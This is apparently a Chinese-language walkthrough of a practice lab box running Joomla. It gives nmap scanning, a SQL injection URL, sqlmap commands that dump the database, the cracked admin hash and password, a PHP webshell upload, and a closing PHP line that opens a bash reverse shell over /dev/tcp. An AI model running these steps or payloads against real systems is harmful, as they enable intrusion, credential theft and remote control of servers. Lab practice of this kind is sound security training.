扫描发现主机 nmap -sn 192.168.1.0/24

扫描端口，访问web界面


 

通过页面可知该系统cms为Joomia 


通过扫描目录发现后台登录地址


使用kail的joomascan对网页漏洞搜索


 

使用msf对joomla版本漏洞进行搜索，无结果，在百度对该cms的版本相关漏洞进行搜索，发现存在sql注入，并且有构造的url进行访问

http://192.168.1.95/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1


http://192.168.1.95/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1%E2%80%98


使用sqlmap进行数据库探测，跑出关于账号和密码

 

python ./sqlmap.py -u "http://192.168.1.95/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=1" --dbs --batch

跑出数据库

 

python ./sqlmap.py -u "http://192.168.1.95/index.php?

option=com_fields&view=fields&layout=modal&list[fullordering]=1" -D joomladb --tables --batch

 查看数据库中的列表，发现#_users

 

通过sql注入得到了管理员的账号和密码分别是admin和 $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu

采用john暴力破解他的密码hash：$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu,将此段hash密码存入新建文件pass中，然后使用john破解，可得到密码snoop


对后台系统进行登录



在页面找到可以上传php一句话木马，构造上传的路径访问，用菜刀进行连接


但是用菜刀反弹shell的时候一直报错，所以将1.php的内容改为

<?php

exec("bash -c 'bash -i >& /dev/tcp/192.168.1.95/1234 0>&1'");
